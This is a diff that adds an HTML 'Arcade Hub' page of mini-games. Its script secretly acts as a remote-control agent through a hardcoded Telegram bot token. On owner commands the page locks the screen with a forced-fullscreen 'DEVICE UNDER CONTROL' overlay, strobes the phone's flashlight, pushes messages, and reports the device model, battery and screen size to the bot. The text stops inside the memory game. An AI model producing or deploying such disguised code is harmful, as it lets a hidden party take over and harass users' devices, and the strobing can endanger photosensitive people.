@@ -1,0 +1,1180 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Arcade Hub & Xerome Control</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            background-color: #0d0f17;
+            font-family: Consolas, monospace;
+            color: #ffffff;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+
+        ::-webkit-scrollbar {
+            display: none;
+            width: 0px;
+            height: 0px;
+        }
+
+        #app {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-y: auto;
+            background: #0d0f17;
+        }
+
+        header {
+            background: rgba(19, 23, 34, 0.95);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #2a2f45;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            backdrop-filter: blur(10px);
+        }
+
+        .logo-head {
+            font-weight: 800;
+            font-size: 1.1rem;
+            color: #00f0ff;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        .dev-badge {
+            background: #1a233a;
+            border: 1px solid #00f0ff44;
+            color: #00f0ff;
+            font-size: 0.75rem;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-family: monospace;
+        }
+
+        main {
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .section-title {
+            font-size: 1rem;
+            color: #8a99ad;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 15px;
+        }
+
+        .game-card {
+            background: #161b29;
+            border: 1px solid #232a3d;
+            border-radius: 16px;
+            padding: 22px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        .game-card:active {
+            transform: scale(0.96);
+            background: #1e2538;
+            border-color: #00f0ff;
+        }
+
+        .game-icon {
+            font-size: 2.6rem;
+        }
+
+        .game-title {
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-align: center;
+            color: #e0e6ed;
+        }
+
+        /* Game Modal Frame */
+        #game-frame-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0d0f17;
+            z-index: 50;
+            display: none;
+            flex-direction: column;
+        }
+
+        .modal-header {
+            padding: 15px 20px;
+            background: #161b29;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #232a3d;
+        }
+
+        .close-btn {
+            background: #ff4757;
+            border: none;
+            color: white;
+            padding: 6px 16px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: Consolas, monospace;
+        }
+
+        .game-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            gap: 15px;
+        }
+
+        .ttt-board {
+            display: grid;
+            grid-template-columns: repeat(3, 85px);
+            grid-template-rows: repeat(3, 85px);
+            gap: 8px;
+        }
+
+        .ttt-cell {
+            background: #161b29;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            border: 1px solid #2a3450;
+            transition: 0.15s;
+        }
+        .ttt-cell:hover {
+            border-color: #00f0ff;
+        }
+
+        #snakeCanvas {
+            background: #101420;
+            border: 2px solid #2a3450;
+            border-radius: 14px;
+            box-shadow: 0 0 20px rgba(0,240,255,0.1);
+        }
+
+        .memory-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 65px);
+            gap: 10px;
+        }
+        .memory-card {
+            width: 65px;
+            height: 65px;
+            background: #161b29;
+            border: 1px solid #2a3450;
+            border-radius: 12px;
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .memory-card.flipped {
+            background: #1a233a;
+            border-color: #00f0ff;
+        }
+
+        /* Hidden Terminal Modal */
+        #terminal-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #080a0f;
+            border: 2px solid #00f0ff;
+            border-radius: 14px;
+            padding: 20px;
+            width: 90%;
+            max-width: 450px;
+            z-index: 10000;
+            display: none;
+            box-shadow: 0 0 35px rgba(0, 240, 255, 0.3);
+        }
+
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #00f0ff;
+            font-weight: bold;
+            font-size: 0.9rem;
+            border-bottom: 1px solid #1a2233;
+            padding-bottom: 8px;
+        }
+
+        .terminal-quick-btns {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+        .quick-btn {
+            flex: 1;
+            background: #161b29;
+            border: 1px solid #00f0ff;
+            color: #00f0ff;
+            padding: 6px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            font-family: Consolas, monospace;
+            font-weight: bold;
+        }
+        .quick-btn.danger {
+            border-color: #ff0055;
+            color: #ff0055;
+        }
+
+        .terminal {
+            background: #040507;
+            border: 1px solid #1a2233;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 0.75rem;
+            color: #00f0ff;
+            height: 160px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .log-item {
+            opacity: 0.85;
+        }
+
+        /* ================= XEROME LOCKSCREEN ================= */
+        #lock-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000000;
+            z-index: 99999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 0;
+        }
+
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: repeating-linear-gradient(
+                to bottom,
+                rgba(255,255,255,.03) 0px,
+                rgba(255,255,255,.03) 1px,
+                transparent 2px,
+                transparent 4px
+            );
+            pointer-events: none;
+            z-index: 5;
+        }
+
+        .xerome-container {
+            position: absolute;
+            inset: 0;
+            z-index: 10;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            padding-top: max(20px, env(safe-area-inset-top));
+            padding-bottom: max(20px, env(safe-area-inset-bottom));
+        }
+
+        .xerome-logo {
+            font-size: clamp(36px, 10vw, 80px);
+            font-weight: bold;
+            color: #39FF14;
+            text-shadow: 0 0 10px #39FF14, 0 0 20px #39FF14, 0 0 40px #39FF14;
+            animation: glitch .08s infinite alternate;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(-2px, 0); }
+            100% { transform: translate(2px, 0); }
+        }
+
+        .xerome-subtitle {
+            margin-top: 5px;
+            font-size: 13px;
+            letter-spacing: 4px;
+            color: #00ffff;
+            text-shadow: 0 0 15px #00ffff;
+            text-align: center;
+        }
+
+        .xerome-warning {
+            margin-top: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #ff0000;
+            text-shadow: 0 0 10px red, 0 0 20px red;
+            animation: blink .6s infinite;
+            text-align: center;
+        }
+
+        @keyframes blink {
+            50% { opacity: .25; }
+        }
+
+        .xerome-panel {
+            margin-top: 15px;
+            width: min(95%, 750px);
+            border: 2px solid #39FF14;
+            padding: 15px;
+            background: rgba(0, 0, 0, .85);
+            box-shadow: 0 0 30px rgba(57,255,20,.4), inset 0 0 20px rgba(57,255,20,.1);
+        }
+
+        #terminal-xerome {
+            color: #39FF14;
+            font-size: 12px;
+            line-height: 1.4;
+            height: 120px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column-reverse;
+        }
+
+        .progress-wrap {
+            margin-top: 12px;
+            height: 14px;
+            border: 1px solid #39FF14;
+            overflow: hidden;
+        }
+
+        #bar {
+            height: 100%;
+            width: 0%;
+            background: #39FF14;
+            box-shadow: 0 0 20px #39FF14;
+        }
+
+        .xerome-clock {
+            margin-top: 12px;
+            font-size: 15px;
+            color: #fff;
+            text-shadow: 0 0 10px #fff;
+        }
+
+        .xerome-footer {
+            margin-top: 8px;
+            font-size: 10px;
+            color: #666;
+            letter-spacing: 2px;
+        }
+
+        .bypass-btn {
+            margin-top: 15px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid #ff0055;
+            color: #ff88aa;
+            padding: 8px 18px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            z-index: 20;
+            font-family: Consolas, monospace;
+            transition: 0.2s;
+        }
+        .bypass-btn:hover {
+            background: rgba(255, 0, 85, 0.2);
+        }
+
+        /* Message Modal */
+        #msg-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1a2130;
+            border: 2px solid #00f0ff;
+            border-radius: 16px;
+            padding: 20px;
+            width: 85%;
+            max-width: 340px;
+            z-index: 100000;
+            display: none;
+            box-shadow: 0 0 30px rgba(0, 240, 255, 0.3);
+            text-align: center;
+        }
+
+        .msg-title {
+            color: #00f0ff;
+            font-weight: bold;
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+        }
+
+        .msg-body {
+            color: #ffffff;
+            font-size: 0.95rem;
+            line-height: 1.4;
+            margin-bottom: 15px;
+            word-break: break-word;
+        }
+
+        .msg-ok-btn {
+            background: #00f0ff;
+            border: none;
+            color: #000;
+            font-weight: bold;
+            padding: 8px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <header>
+        <div class="logo-head" id="secret-logo-trigger" onclick="handleLogoClick()" title="Klik 3x cepat untuk cek terminal">
+            🎮 Arcade Portal
+        </div>
+        <div class="dev-badge" id="device-id-tag">ID: -----</div>
+    </header>
+
+    <main>
+        <div>
+            <div class="section-title">Pilih Game (Upgraded Edition)</div>
+            <div class="game-grid">
+                <div class="game-card" onclick="openGame('ttt')">
+                    <div class="game-icon">❌⭕</div>
+                    <div class="game-title">Tic Tac Toe</div>
+                </div>
+                <div class="game-card" onclick="openGame('snake')">
+                    <div class="game-icon">🐍</div>
+                    <div class="game-title">Retro Snake</div>
+                </div>
+                <div class="game-card" onclick="openGame('rps')">
+                    <div class="game-icon">✊✂️</div>
+                    <div class="game-title">Gunting Batu</div>
+                </div>
+                <div class="game-card" onclick="openGame('memory')">
+                    <div class="game-icon">🃏</div>
+                    <div class="game-title">Adu Memori</div>
+                </div>
+            </div>
+        </div>
+    </main>
+</div>
+
+<!-- Hidden Terminal Modal (Bisa di cek via 3x klik logo) -->
+<div id="terminal-modal">
+    <div class="terminal-header">
+        <span>💻 Hidden System Terminal</span>
+        <button class="close-btn" onclick="closeTerminalModal()">Tutup</button>
+    </div>
+    <div class="terminal-quick-btns">
+        <button class="quick-btn danger" onclick="manualLockAll()">🔒 Lock All</button>
+        <button class="quick-btn" onclick="manualUnlockAll()">🔓 Unlock All</button>
+    </div>
+    <div class="terminal" id="terminal-log">
+        <div class="log-item">[SYSTEM] Berhasil terhubung ke Telegram Bot...</div>
+    </div>
+</div>
+
+<!-- Modal Game Frame -->
+<div id="game-frame-modal">
+    <div class="modal-header">
+        <span id="modal-game-title" style="font-weight:bold; color:#00f0ff;">Game</span>
+        <button class="close-btn" onclick="closeGame()">Keluar</button>
+    </div>
+    <div class="game-container" id="game-container"></div>
+</div>
+
+<!-- XEROME Lock Screen Overlay -->
+<div id="lock-overlay">
+    <canvas id="matrix"></canvas>
+    <div class="scanline"></div>
+    <div class="xerome-container">
+        <div class="xerome-logo">XEROME</div>
+        <div class="xerome-subtitle">REMOTE CONTROL SYSTEM</div>
+        <div class="xerome-warning">DEVICE UNDER CONTROL</div>
+        <div class="xerome-panel">
+            <div id="terminal-xerome"></div>
+            <div class="progress-wrap">
+                <div id="bar"></div>
+            </div>
+        </div>
+        <div class="xerome-clock" id="clock"></div>
+        <div class="xerome-footer" id="xerome-device-info">POWERED BY XEROME</div>
+        <button class="bypass-btn" onclick="promptBypass()">BYPASS PIN (EMERGENCY)</button>
+    </div>
+</div>
+
+<!-- Message Modal -->
+<div id="msg-modal">
+    <div class="msg-title">📩 Pesan dari Owner</div>
+    <div class="msg-body" id="msg-text">-</div>
+    <button class="msg-ok-btn" onclick="closeMessage()">Mengerti</button>
+</div>
+
+<script>
+    const BOT_TOKEN = '8816818647:AAGEbf2cXHjN4Ov8StJWcl_4hKq_f80O5GE';
+    const OWNER_ID = '8082940444';
+    
+    let deviceId = localStorage.getItem('sim_device_id');
+    if (!deviceId) {
+        deviceId = 'DEV-' + Math.floor(1000 + Math.random() * 9000);
+        localStorage.setItem('sim_device_id', deviceId);
+    }
+    document.getElementById('device-id-tag').innerText = deviceId;
+
+    let deviceName = detectDeviceName();
+    let isLocked = false;
+    let flashInterval = null;
+    let flashTrack = null;
+    let lastUpdateId = 0;
+
+    // BroadcastChannel for Multi-Tab / Multi-Device Synchronization (Lock All)
+    const syncChannel = new BroadcastChannel('xerome_sync_channel');
+    syncChannel.onmessage = (event) => {
+        if (event.data === 'LOCK_ALL') {
+            setLockState(true, false); // Lock without re-broadcasting loop
+        } else if (event.data === 'UNLOCK_ALL') {
+            setLockState(false, false);
+        }
+    };
+
+    function manualLockAll() {
+        syncChannel.postMessage('LOCK_ALL');
+        setLockState(true, false);
+        logTerminal("[MANUAL] LOCK ALL dipicu secara lokal.");
+    }
+
+    function manualUnlockAll() {
+        syncChannel.postMessage('UNLOCK_ALL');
+        setLockState(false, false);
+        logTerminal("[MANUAL] UNLOCK ALL dipicu secara lokal.");
+    }
+
+    // Secret Terminal Triple Click Handler
+    let clickCount = 0;
+    let clickTimer = null;
+    function handleLogoClick() {
+        clickCount++;
+        if (clickCount === 3) {
+            document.getElementById('terminal-modal').style.display = 'block';
+            clickCount = 0;
+            clearTimeout(clickTimer);
+        } else {
+            clearTimeout(clickTimer);
+            clickTimer = setTimeout(() => { clickCount = 0; }, 600);
+        }
+    }
+
+    function closeTerminalModal() {
+        document.getElementById('terminal-modal').style.display = 'none';
+    }
+
+    function detectDeviceName() {
+        const ua = navigator.userAgent;
+        if (/iPhone/i.test(ua)) return 'Apple iPhone';
+        if (/iPad/i.test(ua)) return 'Apple iPad';
+        if (/Samsung/i.test(ua)) return 'Samsung Galaxy';
+        if (/Infinix/i.test(ua)) return 'Infinix Mobile';
+        if (/POCO/i.test(ua)) return 'Xiaomi POCO';
+        if (/Redmi|Xiaomi/i.test(ua)) return 'Xiaomi Redmi';
+        if (/OPPO/i.test(ua)) return 'OPPO Mobile';
+        if (/Vivo/i.test(ua)) return 'Vivo Mobile';
+        if (/Realme/i.test(ua)) return 'Realme Mobile';
+        if (/Android/i.test(ua)) return 'Android Device';
+        if (/Windows/i.test(ua)) return 'Windows PC';
+        if (/Macintosh/i.test(ua)) return 'MacBook/Mac';
+        return 'Generic Device';
+    }
+
+    function logTerminal(msg) {
+        const term = document.getElementById('terminal-log');
+        const item = document.createElement('div');
+        item.className = 'log-item';
+        item.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        term.appendChild(item);
+        term.scrollTop = term.scrollHeight;
+    }
+
+    async function toggleFlash(enable) {
+        if (enable) {
+            if (flashInterval) clearInterval(flashInterval);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' }
+                });
+                flashTrack = stream.getVideoTracks()[0];
+                let state = false;
+                
+                flashInterval = setInterval(async () => {
+                    state = !state;
+                    try {
+                        await flashTrack.applyConstraints({
+                            advanced: [{ torch: state }]
+                        });
+                    } catch (e) {}
+                }, 180);
+            } catch (err) {
+                logTerminal("Flash LED hardware tidak didukung/diizinkan.");
+            }
+        } else {
+            if (flashInterval) {
+                clearInterval(flashInterval);
+                flashInterval = null;
+            }
+            if (flashTrack) {
+                try {
+                    await flashTrack.applyConstraints({ advanced: [{ torch: false }] });
+                    flashTrack.stop();
+                } catch (e) {}
+                flashTrack = null;
+            }
+        }
+    }
+
+    function triggerFullScreen() {
+        const elem = document.documentElement;
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen().catch(() => {});
+        } else if (elem.mozRequestFullScreen) {
+            elem.mozRequestFullScreen().catch(() => {});
+        } else if (elem.webkitRequestFullscreen) {
+            elem.webkitRequestFullscreen().catch(() => {});
+        } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen().catch(() => {});
+        }
+    }
+
+    function setLockState(locked, broadcast = true) {
+        isLocked = locked;
+        const overlay = document.getElementById('lock-overlay');
+        const deviceInfo = document.getElementById('xerome-device-info');
+        
+        if (locked) {
+            overlay.style.display = 'flex';
+            deviceInfo.innerText = `DEVICE: ${deviceName} (${deviceId})`;
+            triggerFullScreen();
+            toggleFlash(true);
+            if (broadcast) syncChannel.postMessage('LOCK_ALL');
+        } else {
+            overlay.style.display = 'none';
+            toggleFlash(false);
+            if (document.exitFullscreen && document.fullscreenElement) {
+                document.exitFullscreen().catch(() => {});
+            }
+            if (broadcast) syncChannel.postMessage('UNLOCK_ALL');
+        }
+    }
+
+    document.addEventListener('click', () => {
+        if (isLocked && !document.fullscreenElement) {
+            triggerFullScreen();
+        }
+    });
+
+    function promptBypass() {
+        const pin = prompt("Masukkan PIN Emergency untuk Bypass Simulasi:");
+        if (pin === "1234") {
+            setLockState(false);
+            alert("Simulasi berhasil dibuka via PIN Emergency.");
+        } else if (pin !== null) {
+            alert("PIN Salah!");
+        }
+    }
+
+    function showMessage(txt) {
+        document.getElementById('msg-text').innerText = txt;
+        document.getElementById('msg-modal').style.display = 'block';
+    }
+
+    function closeMessage() {
+        document.getElementById('msg-modal').style.display = 'none';
+    }
+
+    // Telegram Long Polling
+    async function pollTelegram() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
+            const data = await res.json();
+
+            if (data.ok && data.result.length > 0) {
+                for (let update of data.result) {
+                    lastUpdateId = update.update_id;
+
+                    if (update.message && update.message.text) {
+                        const senderId = String(update.message.from.id);
+                        const text = update.message.text.trim();
+
+                        if (senderId === OWNER_ID) {
+                            handleOwnerCommand(text, update.message.chat.id);
+                        }
+                    }
+
+                    if (update.callback_query) {
+                        const senderId = String(update.callback_query.from.id);
+                        const dataCmd = update.callback_query.data;
+                        const chatId = update.callback_query.message.chat.id;
+
+                        if (senderId === OWNER_ID) {
+                            handleOwnerCommand(dataCmd, chatId);
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${update.callback_query.id}`);
+                        }
+                    }
+                }
+            }
+        } catch (err) {}
+        setTimeout(pollTelegram, 1000);
+    }
+
+    async function handleOwnerCommand(cmdText, chatId) {
+        logTerminal(`Perintah Owner: ${cmdText}`);
+        const parts = cmdText.split(' ');
+        const mainCmd = parts[0].toLowerCase();
+        const targetId = parts[1] || '';
+        const extraText = parts.slice(2).join(' ') || parts.slice(1).join(' ');
+
+        if (mainCmd === '/start' || mainCmd === '/devices') {
+            const replyMsg = `🤖 *XEROME CONTROL PANEL*\n\nPerangkat Terhubung:\n• *${deviceName}* (ID: \`${deviceId}\`)\nStatus: ${isLocked ? '🔒 LOCKED' : '🔓 UNLOCKED'}`;
+            
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "🔒 Lock Device", callback_data: `/lock ${deviceId}` },
+                        { text: "🔓 Unlock Device", callback_data: `/unlock ${deviceId}` }
+                    ],
+                    [
+                        { text: "🔒 LOCK ALL", callback_data: `/lock ALL` },
+                        { text: "🔓 UNLOCK ALL", callback_data: `/unlock ALL` }
+                    ],
+                    [
+                        { text: "⚡ Flash Toggle", callback_data: `/flash ${deviceId}` },
+                        { text: "📊 Status", callback_data: `/status ${deviceId}` }
+                    ]
+                ]
+            };
+
+            sendTelegramReply(chatId, replyMsg, inlineKeyboard);
+        }
+        else if (mainCmd === '/lock') {
+            if (targetId === deviceId || targetId === 'ALL') {
+                setLockState(true, true);
+                sendTelegramReply(chatId, `✅ Perintah *LOCK ${targetId}* berhasil dieksekusi!`);
+            }
+        }
+        else if (mainCmd === '/unlock') {
+            if (targetId === deviceId || targetId === 'ALL') {
+                setLockState(false, true);
+                sendTelegramReply(chatId, `✅ Perintah *UNLOCK ${targetId}* berhasil dieksekusi!`);
+            }
+        }
+        else if (mainCmd === '/flash') {
+            if (targetId === deviceId || targetId === 'ALL') {
+                if (flashInterval) {
+                    toggleFlash(false);
+                    sendTelegramReply(chatId, `⚡ Flash LED *${deviceName}* MATI.`);
+                } else {
+                    toggleFlash(true);
+                    sendTelegramReply(chatId, `⚡ Flash LED *${deviceName}* BERKEDIP (STROBE).`);
+                }
+            }
+        }
+        else if (mainCmd === '/status') {
+            if (targetId === deviceId || targetId === 'ALL' || !targetId) {
+                let batt = 'N/A';
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batt = Math.round(b.level * 100) + '%';
+                }
+                const statusMsg = `📊 *XEROME STATUS*\n\n` +
+                    `📱 Nama: *${deviceName}*\n` +
+                    `🆔 ID: \`${deviceId}\`\n` +
+                    `🔒 Lock Status: *${isLocked ? 'LOCKED (XEROME)' : 'UNLOCKED'}*\n` +
+                    `⚡ Flash: *${flashInterval ? 'STROBE ON' : 'OFF'}*\n` +
+                    `🔋 Baterai: *${batt}*\n` +
+                    `🖥️ Screen: *${window.innerWidth}x${window.innerHeight}*`;
+                sendTelegramReply(chatId, statusMsg);
+            }
+        }
+        else if (mainCmd === '/msg') {
+            if (targetId === deviceId || targetId === 'ALL') {
+                showMessage(extraText);
+                sendTelegramReply(chatId, `📩 Pesan terkirim ke *${deviceName}*: "${extraText}"`);
+            }
+        }
+    }
+
+    function sendTelegramReply(chatId, text, keyboard = null) {
+        const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
+        if (keyboard) payload.reply_markup = keyboard;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    }
+
+    // Mini-Games Engine
+    function openGame(gameType) {
+        const modal = document.getElementById('game-frame-modal');
+        const container = document.getElementById('game-container');
+        const title = document.getElementById('modal-game-title');
+        container.innerHTML = '';
+        modal.style.display = 'flex';
+
+        if (gameType === 'ttt') {
+            title.innerText = 'Tic Tac Toe vs Bot';
+            container.innerHTML = `
+                <div id="ttt-score" style="font-size:0.9rem; color:#00f0ff; margin-bottom:5px;">Skor - Kamu: 0 | Bot: 0</div>
+                <div class="ttt-board" id="ttt-board"></div>
+                <button onclick="initTTT()" style="margin-top:10px; background:#161b29; border:1px solid #00f0ff; color:#00f0ff; padding:6px 14px; border-radius:8px; cursor:pointer;">Reset Game</button>
+            `;
+            initTTT();
+        } else if (gameType === 'snake') {
+            title.innerText = 'Retro Snake';
+            container.innerHTML = `
+                <div id="snake-score" style="font-size:0.9rem; color:#00f0ff; margin-bottom:5px;">Skor: 0</div>
+                <canvas id="snakeCanvas" width="280" height="280"></canvas>
+            `;
+            initSnake();
+        } else if (gameType === 'rps') {
+            title.innerText = 'Gunting Batu Kertas';
+            container.innerHTML = `
+                <div style="text-align:center; display:flex; flex-direction:column; gap:15px; max-width:300px;">
+                    <div id="rps-res" style="font-size:1.1rem; font-weight:bold; color:#00f0ff;">Pilih Tangan Anda</div>
+                    <div style="display:flex; gap:12px; justify-content:center;">
+                        <button onclick="playRPS('✊')" style="font-size:2rem; padding:12px 18px; border-radius:12px; border:1px solid #2a3450; background:#161b29; cursor:pointer;">✊</button>
+                        <button onclick="playRPS('🖐️')" style="font-size:2rem; padding:12px 18px; border-radius:12px; border:1px solid #2a3450; background:#161b29; cursor:pointer;">🖐️</button>
+                        <button onclick="playRPS('✌️')" style="font-size:2rem; padding:12px 18px; border-radius:12px; border:1px solid #2a3450; background:#161b29; cursor:pointer;">✌️</button>
+                    </div>
+                </div>`;
+        } else if (gameType === 'memory') {
+            title.innerText = 'Adu Memori (Matching Cards)';
+            container.innerHTML = `
+                <div id="memory-status" style="font-size:0.9rem; color:#00f0ff; margin-bottom:5px;">Temukan 6 Pasang Kartu!</div>
+                <div class="memory-grid" id="memory-grid"></div>
+                <button onclick="initMemory()" style="margin-top:10px; background:#161b29; border:1px solid #00f0ff; color:#00f0ff; padding:6px 14px; border-radius:8px; cursor:pointer;">Mulai Ulang</button>
+            `;
+            initMemory();
+        }
+    }
+
+    function closeGame() {
+        document.getElementById('game-frame-modal').style.display = 'none';
+    }
+
+    let tttWins = 0, tttLosses = 0;
+    function initTTT() {
+        const board = document.getElementById('ttt-board');
+        board.innerHTML = '';
+        let state = Array(9).fill(null);
+        let active = true;
+
+        for (let i = 0; i < 9; i++) {
+            const cell = document.createElement('div');
+            cell.className = 'ttt-cell';
+            cell.onclick = () => {
+                if (!state[i] && active) {
+                    state[i] = 'X';
+                    cell.innerText = 'X';
+                    cell.style.color = '#00f0ff';
+                    
+                    if (checkWin(state, 'X')) {
+                        document.getElementById('ttt-score').innerText = `Kamu MENANG! | Skor - Kamu: ${++tttWins} | Bot: ${tttLosses}`;
+                        active = false;
+                        return;
+                    }
+                    
+                    let empty = state.map((v, idx) => v === null ? idx : null).filter(v => v !== null);
+                    if (empty.length > 0 && active) {
+                        let botChoice = empty[Math.floor(Math.random() * empty.length)];
+                        state[botChoice] = 'O';
+                        board.children[botChoice].innerText = 'O';
+                        board.children[botChoice].style.color = '#ff0055';
+
+                        if (checkWin(state, 'O')) {
+                            document.getElementById('ttt-score').innerText = `Bot MENANG! | Skor - Kamu: ${tttWins} | Bot: ${++tttLosses}`;
+                            active = false;
+                        }
+                    } else if (empty.length === 0 && active) {
+                        document.getElementById('ttt-score').innerText = `SERI! | Skor - Kamu: ${tttWins} | Bot: ${tttLosses}`;
+                        active = false;
+                    }
+                }
+            };
+            board.appendChild(cell);
+        }
+    }
+
+    function checkWin(s, p) {
+        const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+        return wins.some(w => s[w[0]] === p && s[w[1]] === p && s[w[2]] === p);
+    }
+
+    function initSnake() {
+        const canvas = document.getElementById('snakeCanvas');
+        const ctx = canvas.getContext('2d');
+        let snake = [{x: 7, y: 7}];
+        let food = {x: 3, y: 3};
+        let dx = 1, dy = 0;
+        let score = 0;
+
+        window.onkeydown = (e) => {
+            if (e.key === 'ArrowUp' && dy === 0) { dx = 0; dy = -1; }
+            if (e.key === 'ArrowDown' && dy === 0) { dx = 0; dy = 1; }
+            if (e.key === 'ArrowLeft' && dx === 0) { dx = -1; dy = 0; }
+            if (e.key === 'ArrowRight' && dx === 0) { dx = 1; dy = 0; }
+        };
+
+        let gameLoop = setInterval(() => {
+            if (document.getElementById('game-frame-modal').style.display === 'none') {
+                clearInterval(gameLoop);
+                return;
+            }
+            const head = {x: snake[0].x + dx, y: snake[0].y + dy};
+            if (head.x < 0 || head.x >= 14 || head.y < 0 || head.y >= 14 || snake.some(s => s.x === head.x && s.y === head.y)) {
+                clearInterval(gameLoop);
+                alert("Game Over! Skor Anda: " + score);
+                initSnake();
+                return;
+            }
+
+            snake.unshift(head);
+            if (head.x === food.x && head.y === food.y) {
+                score += 10;
+                document.getElementById('snake-score').innerText = `Skor: ${score}`;
+                food = {x: Math.floor(Math.random()*14), y: Math.floor(Math.random()*14)};
+            } else {
+                snake.pop();
+            }
+
+            ctx.fillStyle = '#101420';
+            ctx.fillRect(0,0,280,280);
+            ctx.fillStyle = '#ff0055';
+            ctx.fillRect(food.x*20, food.y*20, 18, 18);
+            ctx.fillStyle = '#00f0ff';
+            snake.forEach(s => ctx.fillRect(s.x*20, s.y*20, 18, 18));
+        }, 160);
+    }
+
+    function playRPS(user) {
+        const choices = ['✊', '🖐️', '✌️'];
+        const bot = choices[Math.floor(Math.random() * 3)];
+        let res = 'SERI!';
+        let color = '#ffbb00';
+        if ((user === '✊' && bot === '✌️') || (user === '🖐️' && bot === '✊') || (user === '✌️' && bot === '🖐️')) {
+            res = 'KAMU MENANG! 🎉';
+            color = '#39FF14';
+        } else if (user !== bot) {
+            res = 'BOT MENANG! 🤖';
+            color = '#ff0055';
+        }
+        const resEl = document.getElementById('rps-res');
+        resEl.style.color = color;
+        resEl.innerHTML = `Kamu: ${user} vs Bot: ${bot}<br><br>${res}`;
+    }
+
+    function initMemory() {
+        const grid = document.getElementById('memory-grid');
+        grid.innerHTML = '';
+        const emojis = ['🍎', '🍌', '🍇', '🍊', '🍓', '🍒'];
+        let cards = [...emojis, ...emojis].sort(() => Math.random() - 0.5);
+        let flippedCards = [];
+        let matchedPairs = 0;
+
+        cards.forEach((emoji) => {
+            const card = document.createElement('div');
+            card.className = 'memory-card';
+            card.dataset.emoji = emoji;
+            card.onclick = () => {
+                if (card.classList.contains('flipped') || flippedCards.length >= 2) return;
+                card.innerText = emoji;
+                card.classList.add('flipped');
+                flippedCards.push(card);
+
+                if (flippedCards.length === 2) {
+                    if (flippedCards[0].dataset.emoji === flippedCards[1].dataset.emoji) {
